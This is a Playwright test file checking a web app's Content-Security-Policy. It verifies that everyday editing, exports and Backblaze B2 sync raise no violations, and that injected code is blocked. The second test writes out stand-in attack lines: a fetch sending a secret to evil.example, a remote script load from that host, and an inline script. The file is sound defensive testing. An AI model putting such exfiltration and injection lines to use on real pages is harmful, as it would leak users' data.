// The production build's Content-Security-Policy: everyday use works without
// a single violation, and injected code cannot load scripts or send data
// anywhere but the app itself and Backblaze B2.
import { readFileSync } from "node:fs";
import { expect, test, type Page } from "@playwright/test";
import { FAKE_B2, installFakeB2, type FakeBucket } from "./fakeB2";
import { exportAs } from "./helpers";
import { typeSample } from "./sampleSteps";

async function collectViolations(page: Page): Promise<string[]> {
  const seen: string[] = [];
  await page.exposeFunction("__cspViolation", (v: string) => seen.push(v));
  await page.addInitScript(() => {
    document.addEventListener("securitypolicyviolation", (e) =>
      (window as unknown as { __cspViolation: (v: string) => void }).__cspViolation(
        `${e.effectiveDirective} ${e.blockedURI}`,
      ),
    );
  });
  page.on("console", (m) => {
    if (m.text().includes("Content Security Policy")) seen.push(m.text());
  });
  return seen;
}

test("everyday use causes no CSP violation", async ({ page }) => {
  const violations = await collectViolations(page);
  const bucket: FakeBucket = new Map();
  await installFakeB2(page, bucket);
  await page.goto("/");
  await expect(page.locator('meta[http-equiv="Content-Security-Policy"]')).toHaveCount(1);
  await page.evaluate(() => localStorage.clear());
  await page.reload();

  await typeSample(page);
  for (const name of ["LaTeX (.tex)", "PNG", "PDF"]) {
    const [dl] = await Promise.all([page.waitForEvent("download"), exportAs(page, name)]);
    expect(readFileSync((await dl.path())!).length).toBeGreaterThan(100);
  }

  await page.getByRole("button", { name: "Kết nối Backblaze B2" }).click();
  const form = page.getByRole("form", { name: "Kết nối Backblaze B2" });
  await form.getByLabel("keyID").fill(FAKE_B2.keyId);
  await form.getByLabel("applicationKey").fill(FAKE_B2.appKey);
  await form.getByLabel("Tên bucket").fill(FAKE_B2.bucket);
  await form.getByLabel("Endpoint").fill(FAKE_B2.endpoint);
  await form.getByRole("button", { name: "Kết nối" }).click();
  await expect(page.getByText(`Đã kết nối bucket ${FAKE_B2.bucket}.`)).toBeVisible();
  await page.keyboard.press("Control+s");
  await expect.poll(() => bucket.size).toBe(1);

  expect(violations).toEqual([]);
});

test("injected code cannot load scripts or send data elsewhere", async ({ page }) => {
  const violations = await collectViolations(page);
  let leaked = false;
  await page.route("https://evil.example/**", (r) => {
    leaked = true;
    return r.fulfill({ status: 200, body: "window.__pwned = true" });
  });
  await page.goto("/");
  const result = await page.evaluate(async () => {
    const out: string[] = [];
    try {
      await fetch("https://evil.example/steal?k=secret");
      out.push("fetch ok");
    } catch {
      out.push("fetch blocked");
    }
    const s = document.createElement("script");
    s.src = "https://evil.example/x.js";
    document.head.append(s);
    const inline = document.createElement("script");
    inline.textContent = "window.__pwned = true";
    document.head.append(inline);
    await new Promise((r) => setTimeout(r, 300));
    out.push((window as unknown as { __pwned?: boolean }).__pwned ? "pwned" : "safe");
    return out;
  });
  expect(result).toEqual(["fetch blocked", "safe"]);
  expect(leaked).toBe(false);
  expect(violations.join("\n")).toMatch(/connect-src/);
  expect(violations.join("\n")).toMatch(/script-src/);
});
